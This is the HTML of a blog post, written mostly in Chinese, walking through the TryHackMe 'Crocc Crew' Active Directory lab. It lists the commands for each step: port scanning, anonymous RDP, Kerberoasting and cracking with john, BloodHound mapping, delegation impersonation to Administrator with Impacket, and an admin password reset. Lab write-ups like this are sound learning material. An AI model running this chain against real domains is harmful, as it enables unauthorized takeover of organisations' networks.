@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before all第一次打TryHackMe上面的 Insane 機器!!!好像沒有特別難(?)只有第一步被梗了一下Attacker’s IP : 10.9.195.189Victim’s IP : 10.10.209.233Victim’s IP : fusion.corp Write upReconport scancommand:   1rustscan -a 10.10.209.233">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Crocc Crew Write Up on TryHackMe">
+<meta property="og:url" content="http://wha13.github.io/2024/07/14/thm-crocccrew/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before all第一次打TryHackMe上面的 Insane 機器!!!好像沒有特別難(?)只有第一步被梗了一下Attacker’s IP : 10.9.195.189Victim’s IP : 10.10.209.233Victim’s IP : fusion.corp Write upReconport scancommand:   1rustscan -a 10.10.209.233">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/Sy3RMaxOC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1HtQ6gOA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkjXVpe_0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HywFBaeOC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1UCSaxuR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ry8lv6eOC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1LfDpguC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ry3DDTxu0.png">
+<meta property="article:published_time" content="2024-07-14T15:08:08.000Z">
+<meta property="article:modified_time" content="2024-07-25T09:30:32.267Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="AD">
+<meta property="article:tag" content="Active Directory">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="Pentesting">
+<meta property="article:tag" content="TryHackMe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/Sy3RMaxOC.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Crocc Crew Write Up on TryHackMe</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/07/14/airplane-thm/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/07/13/thm-fusioncorp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/07/14/thm-crocccrew/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/07/14/thm-crocccrew/&text=Crocc Crew Write Up on TryHackMe"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/07/14/thm-crocccrew/&title=Crocc Crew Write Up on TryHackMe"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/07/14/thm-crocccrew/&is_video=false&description=Crocc Crew Write Up on TryHackMe"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Crocc Crew Write Up on TryHackMe&body=Check out this article: http://wha13.github.io/2024/07/14/thm-crocccrew/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/07/14/thm-crocccrew/&title=Crocc Crew Write Up on TryHackMe"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/07/14/thm-crocccrew/&title=Crocc Crew Write Up on TryHackMe"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/07/14/thm-crocccrew/&title=Crocc Crew Write Up on TryHackMe"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/07/14/thm-crocccrew/&title=Crocc Crew Write Up on TryHackMe"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/07/14/thm-crocccrew/&name=Crocc Crew Write Up on TryHackMe&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/07/14/thm-crocccrew/&t=Crocc Crew Write Up on TryHackMe"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-up"><span class="toc-number">2.</span> <span class="toc-text">Write up</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#port-scan"><span class="toc-number">2.1.1.</span> <span class="toc-text">port scan</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#directory-enumeration"><span class="toc-number">2.1.2.</span> <span class="toc-text">directory enumeration</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">2.2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RDP-Investigate-to-Visitor"><span class="toc-number">2.2.1.</span> <span class="toc-text">RDP Investigate to Visitor</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GetUserSPNs-to-reset-password"><span class="toc-number">2.2.2.</span> <span class="toc-text">GetUserSPNs to reset-password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Impersonate-to-Administrator"><span class="toc-number">2.2.3.</span> <span class="toc-text">Impersonate to Administrator</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">3.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Crocc Crew Write Up on TryHackMe
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-07-14T15:08:08.000Z" class="dt-published" itemprop="datePublished">2024-07-14</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/AD/" rel="tag">AD</a>, <a class="p-category" href="/tags/Active-Directory/" rel="tag">Active Directory</a>, <a class="p-category" href="/tags/Pentesting/" rel="tag">Pentesting</a>, <a class="p-category" href="/tags/TryHackMe/" rel="tag">TryHackMe</a>, <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>第一次打TryHackMe上面的 Insane 機器!!!<br>好像沒有特別難(?)<br>只有第一步被梗了一下<br>Attacker’s IP : 10.9.195.189<br>Victim’s IP : 10.10.209.233<br>Victim’s IP : fusion.corp</p>
+<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rustscan -a 10.10.209.233 --<span class="built_in">ulimit</span> 5000 -- -sC -sV --script=ldap*</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/Sy3RMaxOC.png" alt="image">  </p>
+<p>80 port 的web, ldap, KDC還有又是一坨rpc<br>也拿到host name COOCTUS.CORP  </p>
+<p><img src="https://hackmd.io/_uploads/H1HtQ6gOA.png" alt="image">  </p>
+<h4 id="directory-enumeration"><a href="#directory-enumeration" class="headerlink" title="directory enumeration"></a>directory enumeration</h4><p>只有掃出 <code>robots.txt</code>，不過web page是一坨rabbit hole…  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="RDP-Investigate-to-Visitor"><a href="#RDP-Investigate-to-Visitor" class="headerlink" title="RDP Investigate to Visitor"></a>RDP Investigate to Visitor</h4><p><strong>Command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop -u <span class="string">&#x27;&#x27;</span> -f 10.10.209.233:3389</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/rkjXVpe_0.png" alt="image">  </p>
+<p>從Sticky Note拿到Visitor帳密  </p>
+<p>P.S. 那時候打很久，甚至拿webpage上面的username都下去hydra炸rdp密碼，結果都沒成功…，最後跑去看別人WRITE UP才看到要rdp上去看sticky note…  </p>
+<p>喔對，給VMWARE使用者一個溫馨提醒，你無法用 ctrl+alt+ENTER退出全螢幕rdp，要ctrl+alt+f3跳出去純terminal，<code>ps aux</code>後找到rdesktop把它 kill -9 掉。  </p>
+<h4 id="GetUserSPNs-to-reset-password"><a href="#GetUserSPNs-to-reset-password" class="headerlink" title="GetUserSPNs to reset-password"></a>GetUserSPNs to reset-password</h4><p>逛了逛，試看看他可以看到哪些SPNㄅ<br><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GetUserSPNs.py <span class="string">&#x27;cooctus.corp/Visitor:GuestLogin!&#x27;</span> -dc-ip 10.10.209.233 -request</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/HywFBaeOC.png" alt="image"></p>
+<p>拿到password-reset的帳號hash，存在passhash.txt丟john爆破：  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john-the-ripper passhash.txt --wordlist=/home/wha13/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+<p>註：已經爆破過所以改用–show  </p>
+<p><img src="https://hackmd.io/_uploads/S1UCSaxuR.png" alt="image">  </p>
+<h4 id="Impersonate-to-Administrator"><a href="#Impersonate-to-Administrator" class="headerlink" title="Impersonate to Administrator"></a>Impersonate to Administrator</h4><p>先利用bloodhound-python抓整個網路環境：  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -c All -u <span class="string">&#x27;password-reset&#x27;</span> -p <span class="string">&#x27;resetpassword&#x27;</span> -d cooctus.corp -ns 10.10.209.233 --zip</span><br></pre></td></tr></table></figure>
+<p>打開後可以看到 password-reset對<code>oakley/DC.COOCTUS.CORP</code> Allowed To Delegate，可以利用 Impersonate的方法建立暫時的Token登入<br><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ./getST.py -spn <span class="string">&quot;oakley/DC.COOCTUS.CORP&quot;</span> -impersonate <span class="string">&quot;Administrator&quot;</span> <span class="string">&quot;cooctus.corp/password-reset:resetpassword&quot;</span></span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache</span><br><span class="line">python3 ./wmiexec.py -k -no-pass Administrator@DC.COOCTUS.CORP</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/ry8lv6eOC.png" alt="image"><br><img src="https://hackmd.io/_uploads/B1LfDpguC.png" alt="image">  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>成功Admin後我才回去找flag…<br>我疑似有跳步驟(?)<br>上網找了一下別人打法應該要先拿admcrocccrew就是，但我拿不到他的SPN RRR<br>最後，我<code>net user Administrator Whale120</code>改掉密碼後，跑去RDP <del>搞怪</del><br><img src="https://hackmd.io/_uploads/ry3DDTxu0.png" alt="image"><br>hehe，開心，感覺自己真的比較熟一點點ADㄌ  </p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-up"><span class="toc-number">2.</span> <span class="toc-text">Write up</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#port-scan"><span class="toc-number">2.1.1.</span> <span class="toc-text">port scan</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#directory-enumeration"><span class="toc-number">2.1.2.</span> <span class="toc-text">directory enumeration</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">2.2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RDP-Investigate-to-Visitor"><span class="toc-number">2.2.1.</span> <span class="toc-text">RDP Investigate to Visitor</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GetUserSPNs-to-reset-password"><span class="toc-number">2.2.2.</span> <span class="toc-text">GetUserSPNs to reset-password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Impersonate-to-Administrator"><span class="toc-number">2.2.3.</span> <span class="toc-text">Impersonate to Administrator</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">3.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/07/14/thm-crocccrew/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/07/14/thm-crocccrew/&text=Crocc Crew Write Up on TryHackMe"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/07/14/thm-crocccrew/&title=Crocc Crew Write Up on TryHackMe"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/07/14/thm-crocccrew/&is_video=false&description=Crocc Crew Write Up on TryHackMe"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Crocc Crew Write Up on TryHackMe&body=Check out this article: http://wha13.github.io/2024/07/14/thm-crocccrew/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/07/14/thm-crocccrew/&title=Crocc Crew Write Up on TryHackMe"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/07/14/thm-crocccrew/&title=Crocc Crew Write Up on TryHackMe"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/07/14/thm-crocccrew/&title=Crocc Crew Write Up on TryHackMe"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/07/14/thm-crocccrew/&title=Crocc Crew Write Up on TryHackMe"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/07/14/thm-crocccrew/&name=Crocc Crew Write Up on TryHackMe&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/07/14/thm-crocccrew/&t=Crocc Crew Write Up on TryHackMe"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
